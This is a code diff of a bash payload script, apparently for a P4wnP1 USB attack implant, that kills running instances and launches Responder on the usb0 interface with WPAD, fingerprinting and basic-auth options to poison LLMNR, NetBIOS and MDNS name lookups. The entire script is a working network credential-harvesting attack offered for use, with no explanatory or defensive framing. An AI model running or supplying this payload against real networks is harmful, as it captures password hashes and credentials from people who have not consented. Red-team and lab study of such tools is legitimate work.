@@ -1,29 +1,33 @@
 #!/bin/bash
-# payloads/network/responder_attack.sh
-######################################
+# /opt/p4wnp1/payloads/network/responder_attack.sh
+# Description: LLMNR/NetBIOS/MDNS poisoning using system-installed Responder
 
-### Description: Launches Responder for NTLM, LLMNR, and MDNS poisoning
-### Requirements: Responder (clone into /opt/p4wnp1/tools/Responder)
+set -euo pipefail
 
+# === Config ===
 PAYLOAD_NAME="responder_attack"
-RESPONDER_DIR="/opt/p4wnp1/tools/Responder"
+IFACE="usb0"
 LOG_DIR="/opt/p4wnp1/logs"
+LOG_FILE="$LOG_DIR/${PAYLOAD_NAME}.log"
 
 mkdir -p "$LOG_DIR"
+exec > >(tee -a "$LOG_FILE") 2>&1
 
-pkill python3 || true
+echo "[*] Starting Responder attack on $IFACE at $(date)"
 
-if [ ! -d "$RESPONDER_DIR" ]; then
-  echo "[!] Responder not found in $RESPONDER_DIR"
+# === Check Responder.py ===
+if ! command -v Responder.py >/dev/null 2>&1; then
+  echo "[!] Responder.py not found in PATH. Is it installed system-wide?"
   exit 1
 fi
 
-cd "$RESPONDER_DIR"
-
-# Launch Responder with default poisoning options
-python3 Responder.py -I usb0 -wFb -v > "$LOG_DIR/${PAYLOAD_NAME}.log" 2>&1 &
-
+# === Kill any running Responder instances ===
+pkill -f Responder.py || true
 sleep 1
 
-echo "[+] Responder attack started on interface usb0. Logs in $LOG_DIR/${PAYLOAD_NAME}.log"
-exit 0
+# === Launch Responder with common flags ===
+# -w = WPAD, -F = fingerprint, -b = basic auth
+echo "[+] Launching Responder.py on $IFACE with -wFb"
+Responder.py -I "$IFACE" -wFb -v > "$LOG_FILE" 2>&1 &
+
+echo "[✓] Responder poisoning active. Log: $LOG_FILE"
